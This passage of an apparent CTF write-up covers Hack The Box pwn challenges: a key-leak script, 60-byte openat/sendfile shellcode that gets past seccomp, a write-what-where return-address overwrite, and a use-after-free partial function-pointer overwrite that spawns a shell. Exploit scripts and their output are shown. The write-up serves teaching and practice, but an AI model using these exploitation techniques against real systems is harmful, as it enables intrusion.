<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;error&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">password</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># leak key byte by byte</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;165.227.224.55&#34;</span><span class="p">,</span> <span class="mi">32647</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># generate new key</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Length of new password (0-31): &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># send </span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Master password for Vault: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">password</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)[</span><span class="n">x</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span> <span class="c1"># connection throttle</span>
</span></span></code></pre></div><pre tabindex="0"><code>% python dmp.py
H
HT
HTB
HTB{
HTB{l
HTB{l4
HTB{l4_
HTB{l4_c
HTB{l4_c4
HTB{l4_c45
HTB{l4_c454
HTB{l4_c454_
HTB{l4_c454_d
HTB{l4_c454_d3
HTB{l4_c454_d3_
HTB{l4_c454_d3_b
HTB{l4_c454_d3_b0
HTB{l4_c454_d3_b0n
HTB{l4_c454_d3_b0nN
HTB{l4_c454_d3_b0nNi
HTB{l4_c454_d3_b0nNi3
HTB{l4_c454_d3_b0nNi3}
HTB{l4_c454_d3_b0nNi3}
HTB{l4_c454_d3_b0nNi3}
</code></pre><h1 id="3-fleet-management">3. Fleet Management</h1>
<p>Original files are <a href="pwn_fleet_management.zip">here</a>.</p>
<p>Use the hidden menu option <code>9</code> to land in the <code>beta_feature</code> function.
from there it&rsquo;s a classic shellcode writting challenge</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">beta_feature</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">code</span> <span class="o">*</span><span class="n">__buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">__buf</span> <span class="o">=</span> <span class="p">(</span><span class="n">code</span> <span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="mh">0x3c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mprotect</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)((</span><span class="n">ulong</span><span class="p">)</span><span class="n">__buf</span> <span class="o">&amp;</span> <span class="mh">0xfffffffffffff000</span><span class="p">),</span><span class="mh">0x3c</span><span class="p">,</span><span class="mi">7</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">__buf</span><span class="p">,</span><span class="mh">0x3c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">skid_check</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="o">*</span><span class="n">__buf</span><span class="p">)();</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>except that the <code>skid_check()</code> use <code>seccomp</code> to restrict the available syscalls:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">skid_check</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">undefined8</span> <span class="n">uVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">uVar1</span> <span class="o">=</span> <span class="nf">seccomp_init</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">seccomp_rule_add</span><span class="p">(</span><span class="n">uVar1</span><span class="p">,</span><span class="mh">0x7fff0000</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>    <span class="cm">/* exit */</span>
</span></span><span class="line"><span class="cl">    <span class="nf">seccomp_rule_add</span><span class="p">(</span><span class="n">uVar1</span><span class="p">,</span><span class="mh">0x7fff0000</span><span class="p">,</span><span class="mi">231</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>   <span class="cm">/* exit_group */</span>
</span></span><span class="line"><span class="cl">    <span class="nf">seccomp_rule_add</span><span class="p">(</span><span class="n">uVar1</span><span class="p">,</span><span class="mh">0x7fff0000</span><span class="p">,</span><span class="mi">257</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>   <span class="cm">/* openat */</span>
</span></span><span class="line"><span class="cl">    <span class="nf">seccomp_rule_add</span><span class="p">(</span><span class="n">uVar1</span><span class="p">,</span><span class="mh">0x7fff0000</span><span class="p">,</span><span class="mi">40</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>    <span class="cm">/* sendfile */</span>
</span></span><span class="line"><span class="cl">    <span class="nf">seccomp_rule_add</span><span class="p">(</span><span class="n">uVar1</span><span class="p">,</span><span class="mh">0x7fff0000</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>    <span class="cm">/*  rt_sigreturn */</span>
</span></span><span class="line"><span class="cl">    <span class="nf">seccomp_load</span><span class="p">(</span><span class="n">uVar1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>also the shellcode needs to fits in 60 bytes.</p>
<p>I went with the obvious combo <code>openat</code>+<code>sendfile</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="c1">; % nasm -felf64 -o getflag.o getflag.asm</span>
</span></span><span class="line"><span class="cl"><span class="c1">; % ld -o getflag getflag.o    </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">global</span> <span class="nv">_start</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nl">_start:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">xor</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rdx</span>        <span class="c1">; flags</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="mh">0xffffff9c</span> <span class="c1">; AT_FDCWD</span>
</span></span><span class="line"><span class="cl">        <span class="nf">lea</span> <span class="nb">rsi</span><span class="p">,</span> <span class="p">[</span><span class="nv">rel</span> <span class="nv">buf</span><span class="p">]</span>  <span class="c1">; path</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mi">257</span>        <span class="c1">; openat</span>
</span></span><span class="line"><span class="cl">        <span class="nf">syscall</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">xor</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rdi</span>        <span class="c1">; out fd // 0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span> <span class="nb">rsi</span><span class="p">,</span> <span class="nb">rax</span>        <span class="c1">; out fd // from openat result</span>
</span></span><span class="line"><span class="cl">        <span class="nf">xor</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rdx</span>        <span class="c1">; offset // 0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span> <span class="nv">r10</span><span class="p">,</span> <span class="mi">255</span>        <span class="c1">; size</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mi">40</span>         <span class="c1">; sendfile</span>
</span></span><span class="line"><span class="cl">        <span class="nf">syscall</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nl">buf:</span>    <span class="kd">db</span> <span class="s">&#39;flag.txt&#39;</span><span class="p">,</span> <span class="mi">0</span>
</span></span></code></pre></div><p>and the final exploit:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x48\x31\xd2\xbf\x9c\xff\xff\xff\x48\x8d\x35\x1d\x00\x00\x00\xb8\x01\x01\x00\x00\x0f\x05\x48\x31\xff\x48\x89\xc6\x48\x31\xd2\x41\xba\xff\x00\x00\x00\xb8\x28\x00\x00\x00\x0f\x05\x66\x6c\x61\x67\x2e\x74\x78\x74\x00</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;157.245.47.33&#34;</span><span class="p">,</span> <span class="mi">31234</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#34;./fleet_management&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;What do you want to do? &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;9&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">))</span>
</span></span></code></pre></div><pre tabindex="0"><code>% python xpl.py
[+] Opening connection to 157.245.47.33 on port 31234: Done
b&#39;HTB{backd00r_as_a_f3atur3}\n&#39;
[*] Closed connection to 157.245.47.33 port 31234
</code></pre><h1 id="4-hellbound">4. Hellbound</h1>
<p>Original files are <a href="pwn_hellhound.zip">here</a>.</p>
<pre tabindex="0"><code>    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b&#39;./.glibc/&#39;
</code></pre><p>It starts by allocating a 0x40 bytes buffer</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">buffer</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x40</span><span class="p">);</span>
</span></span></code></pre></div><p>option 1 leaks the stack address of <code>buffer</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">[+] In the back of its head you see this serial number: [%ld]</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">buffer</span><span class="p">);</span>
</span></span></code></pre></div><p>option 2 allows you to write 32 bytes in this buffer:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">buffer</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mh">0x20</span><span class="p">);</span>
</span></span></code></pre></div><p>option 3 is our write-what-where</p>
<pre tabindex="0"><code>   0x400d86 &lt;main+191&gt;    mov    rax, qword ptr [rbp - 0x48]    ; rax = *(buffer[0]) // 0x603010 ◂— &#39;AAAABBBBCCCCDDDD\n&#39;
   0x400d8a &lt;main+195&gt;    add    rax, 8                         ; RAX  0x603018 ◂— &#39;CCCCDDDD\n&#39;
   0x400d8e &lt;main+199&gt;    mov    rax, qword ptr [rax]           ; RAX  0x4444444443434343 (&#39;CCCCDDDD&#39;)
 ► 0x400d91 &lt;main+202&gt;    mov    qword ptr [rbp - 0x48], rax    ; buffer[0] = 0x4444444443434343

pwndbg&gt; x/gx $rbp - 0x48
0x7fffffffe3a8:	0x4444444443434343
</code></pre><p>we controll the value of <code>buffer[0]</code> and this value is dereferencedu before writting our input to it&hellip; so we can write anywhere.</p>
<p>hidden option 69 <code>free(buffer[0]); return</code></p>
<p>The flag function is</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">berserk_mode_off</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="n">lVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">lVar1</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;cat ./flag.txt&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">lVar1</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
</span></span><span class="line"><span class="cl">        <span class="nf">__stack_chk_fail</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The binary has full RELRO so we cannot overwrite a GOT entry.</p>
<p>It&rsquo;s not PIE so we do not need leak anything</p>
<p>The plan is to overwrite the return address on the stack witht the address of <code>berserk_mode_off</code>, then pass the free() without crashing and trigger the RET.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;hellhound&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">rem</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">rem</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;167.71.137.43&#34;</span><span class="p">,</span> <span class="mi">30871</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">leak</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;this serial number: \[(.*?)\]&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">modify</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39; code: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&gt; &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&gt; &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">bye</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;69&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">(</span><span class="n">rem</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># save buffer[0] address</span>
</span></span><span class="line"><span class="cl"><span class="n">buffer</span> <span class="o">=</span> <span class="n">leak</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;buffer: </span><span class="si">%s</span><span class="s2">&#34;</span><span class="o">%</span><span class="nb">hex</span><span class="p">(</span><span class="n">buffer</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">modify</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;imstupid&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buffer</span> <span class="o">+</span> <span class="mh">0x50</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="c1"># buffer[0] = stack addr of saved rip (buffer[0] + 0x50)</span>
</span></span><span class="line"><span class="cl"><span class="n">check</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">modify</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">berserk_mode_off</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buffer</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="c1"># saved_rip = berserk_mode_off()</span>
</span></span><span class="line"><span class="cl"><span class="c1"># buffer[0] = buffer</span>
</span></span><span class="line"><span class="cl"><span class="n">check</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># buffer[0] = &#39;\x00&#39;*16</span>
</span></span><span class="line"><span class="cl"><span class="n">modify</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">))</span>                       
</span></span><span class="line"><span class="cl"><span class="c1"># free(NULL)</span>
</span></span><span class="line"><span class="cl"><span class="n">bye</span><span class="p">()</span>                                              
</span></span></code></pre></div><pre tabindex="0"><code>[+] Opening connection to 46.101.25.63 on port 32408: Done
buffer: 0x7ffc352ed008
b&#39;\x1b[1;31m[*] The beast seems quiet.. for the moment..\n&#39;
b&#39;HTB{1t5_5p1r1t_15_5tr0ng3r_th4n_m0d1f1c4t10n5}\n&#39;
[*] Closed connection to 46.101.25.63 port 32408
</code></pre><h1 id="5-trick-or-deal">5. Trick Or Deal</h1>
<p>Original files are <a href="pwn_trick_or_deal.zip">here</a>.</p>
<pre tabindex="0"><code>    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b&#39;./glibc/&#39;
</code></pre><p>initialization:</p>
<pre tabindex="0"><code>storage = malloc(0x50)
*(code **)(storage + 0x48) = printStorage;
</code></pre><p>so storage+0x48 is a function pointer</p>
<p>option 1: calls the function pointer:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-S" data-lang="S"><span class="line"><span class="cl">      <span class="m">00101106</span> <span class="m">48</span> <span class="m">8</span><span class="n">b</span> <span class="m">05</span> <span class="m">33</span> <span class="m">0</span><span class="n">f</span> <span class="m">20</span> <span class="m">00</span>     <span class="n">MOV</span>                  <span class="n">RAX</span><span class="p">,</span><span class="n">qword</span> <span class="n">ptr</span> <span class="n">[storage]</span>
</span></span><span class="line"><span class="cl">      <span class="m">0010110</span><span class="n">d</span> <span class="m">48</span> <span class="m">8</span><span class="n">b</span> <span class="m">50</span> <span class="m">48</span>              <span class="n">MOV</span>                  <span class="n">RDX</span><span class="p">,</span><span class="n">qword</span> <span class="n">ptr</span> <span class="n">[RAX</span> <span class="o">+</span> <span class="mh">0x48</span><span class="n">]</span>
</span></span><span class="line"><span class="cl">      <span class="m">00101111</span> <span class="n">b8</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           <span class="n">MOV</span>                  <span class="n">EAX</span><span class="p">,</span><span class="mh">0x0</span>
</span></span><span class="line"><span class="cl">      <span class="m">00101116</span> <span class="n">ff</span> <span class="n">d2</span>                    <span class="n">CALL</span>                 <span class="n">RDX</span>
</span></span></code></pre></div><p>option 3:   allocate a chunk of user controlled size and write user controlled data to it</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">        <span class="n">size</span> <span class="o">=</span> <span class="nf">read_num</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">offer</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">offer</span><span class="p">,</span><span class="n">size</span><span class="p">);</span>
</span></span></code></pre></div><p>option 4: free the storage pointer but not zero anything&hellip;
<code>free(storage)</code></p>
<p>this function is our target:</p>
<pre tabindex="0"><code>void unlock_storage(void)

{
    fprintf(stdout,&#34;\n%s[*] Bruteforcing Storage Access Code . . .%s\n&#34;,&amp;DAT_001014a6,&amp;DAT_0010149e);
    sleep(2);
    fprintf(stdout,&#34;\n%s* Storage Door Opened *%s\n&#34;,&amp;DAT_0010128b,&amp;DAT_001014e1);
    system(&#34;sh&#34;);
    return;
}
</code></pre><p>the binary is PIE and we dot not know the base address, luckily because the cpu use little endian, we can only overwrite least 2 significat bytes of the function pointer without touch to the base.</p>
<pre tabindex="0"><code>% objdump -M intel -d trick_or_deal| grep &#39;printStorage&gt;:&#39;
0000000000000be6 &lt;printStorage&gt;:
% objdump -M intel -d trick_or_deal| grep &#39;unlock_storage&gt;:&#39;
0000000000000eff &lt;unlock_storage&gt;:

          00                        0x48  function_pointer
          +----------------------------+----+------------+
storage = |                            |e60b|base_addr   |
          +----------------------------+----+------------+
</code></pre><p>if we overwrite the 2 bytes at 0x48 and change them by <code>ff0e</code> - we should have a valid pointer to <code>unlock_storage</code></p>
<p>the plan is a simple use after free:</p>
<ul>
<li>offer = malloc(0x50)</li>
<li>free(storage)</li>
<li>offer = malloc(0x50)        // storage chunk address is reused, so offer = storage</li>
<li>overwrite the 2 least significant bytes of the function pointer to make it point to <code>unlock_storage</code></li>
<li>profit</li>
</ul>
<p>not super stable exploit for some reason :p</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">local_path</span> <span class="o">=</span> <span class="s2">&#34;trick_or_deal&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pty</span> <span class="o">=</span> <span class="n">process</span><span class="o">.</span><span class="n">PTY</span>
